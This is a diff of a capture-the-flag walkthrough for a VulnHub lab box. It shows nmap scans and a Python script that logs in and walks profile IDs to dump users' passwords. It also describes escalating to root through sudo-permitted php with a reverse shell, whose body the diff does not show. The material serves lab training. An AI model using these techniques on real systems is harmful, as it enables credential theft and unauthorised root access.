@@ -9,9 +9,9 @@ First we need to find the device on the network.
 nmap 192.168.56.*
 ```
 
-![Basic nmap](./screenshots/2_nmap.png)
+![Basic nmap](./screenshots/1_finding_device.png)
 
-From the result we can see that our vulnhub box has ip 192.168.56.120. Lets scan the device using nmap again
+From the result we can see that our vulnhub box has ip 192.168.56.126. Lets scan the device using nmap again
 
 ```bash
 nmap 192.168.56.126 -sC -sV -oN nmap
@@ -79,9 +79,9 @@ requests.get("http://192.168.56.125/?page=login",headers=headers)
 data = {"username":"dbadmin","password":"1234"}
 
 with requests.Session() as s:
-    a = s.post("http://192.168.56.125/misc/process.php?act=login",data=data,headers=headers)
+    a = s.post("http://192.168.56.126/misc/process.php?act=login",data=data,headers=headers)
 
-    base_url = "http://192.168.56.125/?page=profile&user_id="
+    base_url = "http://192.168.56.126/?page=profile&user_id="
     print("USER",21*' ',"USERNAME",17*' ',"PASSWORD")
     for i in range(0,100):
         user_url = base_url + str(i)
@@ -112,10 +112,15 @@ And it works ! That's why we say not to use same password for all stuffs !!!
 Lets list all directories and see the contents inside.
 ![Flag 1](./screenshots/16_flag1.png)
 There is your first flag and a note. Do read them.<br>
-Lets get move on. Now, lets see if we can get root (admin) privileges. Do a sudo listing and see the commands **root** can run.
+
+## Getting root
+***
+Lets move on. Now, lets see if we can get root (admin) privileges. Do a sudo listing and see the commands **root** can run.
 ![Sudo listing](./screenshots/17_sudo_list.png)
+<br>
 Whoa !!! root can run php without password. Now you know what to do next.<br>
 Lets create a php reverse shell and get a connection callback.<br>
+
 ![PHP reverse shell](./screenshots/18_revshell.png)
 ```php
 <?php 
@@ -123,13 +128,7 @@ Lets create a php reverse shell and get a connection callback.<br>
 ?>
 ```
 
-<br>
-<br>
-
-## Getting root
-***
-
-Lets run the revershell as root. Since root can run php without password, we get a connection with root priviledges.
+Lets run the reverse shell as root. Since root can run php without password, we get a connection with root priviledges.
 ![Getting root](./screenshots/19_getting_root.png)
 
 And there you have it, you have full control over the box.<br>
